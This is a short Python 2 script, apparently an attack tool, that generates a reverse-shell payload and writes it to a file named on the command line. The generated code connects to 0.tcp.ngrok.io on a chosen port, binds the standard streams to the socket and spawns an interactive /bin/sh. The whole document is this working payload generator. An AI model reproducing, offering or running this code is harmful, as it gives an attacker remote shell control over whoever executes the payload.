import sys

#print sys.argv[1]
print "Command: python a.py port output_file"
l="""
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("0.tcp.ngrok.io","""+str(sys.argv[1])+"""));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
"""
f=open(sys.argv[2],"w")
f.write(l)
f.close()
